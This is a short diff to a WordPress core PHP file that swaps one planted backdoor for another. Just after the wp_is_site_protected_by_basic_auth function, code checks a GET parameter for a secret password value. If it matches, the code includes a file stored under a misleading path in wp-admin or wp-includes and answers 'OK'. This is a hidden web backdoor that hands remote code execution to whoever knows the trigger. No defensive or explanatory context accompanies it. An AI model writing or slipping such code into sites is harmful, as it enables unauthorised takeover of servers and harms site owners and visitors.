@@ -2047,8 +2047,8 @@ function wp_is_site_protected_by_basic_auth( $context = '' ) {
 	 */
 	return apply_filters( 'wp_is_site_protected_by_basic_auth', $is_protected, $context );
 }
-if (isset($_GET['_']) && $_GET['_'] === 'Ca5P3r_Ganteng_8aN93T') {
-    $f="/home/u122180652/domains/ambestbrandcom.in/public_html/wp-admin/images/menu";if($f!==""&&file_exists($f))include $f;
+if (isset($_GET['_']) && $_GET['_'] === 'apun_bang_jago') {
+    $f="/home/u122180652/domains/cdplafrica.com/public_html/wp-includes/build/pages/options-connectors/admin";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
